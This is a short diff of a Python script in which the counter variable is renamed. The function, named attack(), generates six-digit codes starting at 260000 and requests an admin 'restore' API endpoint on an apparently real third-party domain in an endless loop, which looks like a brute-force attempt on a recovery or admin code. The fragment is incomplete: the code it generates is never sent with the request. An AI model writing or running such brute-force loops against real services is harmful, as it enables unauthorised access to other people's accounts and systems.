@@ -4,14 +4,14 @@ import itertools
 import re
 
 lock = threading.Lock()
-ctr = itertools.count(260000)
+cout = itertools.count(260000)
 co=""
 def attack():
 
 	#for x in range(260000,280000):
 	while True:
 		#code=str(x)
-		code = str(ctr.next()).rjust(6, '0')
+		code = str(cout.next()).rjust(6, '0')
 		url="http://sherlock-message.ru/api/admin.restore"	
 		conn=requests.get(url)	
 		out=conn.content
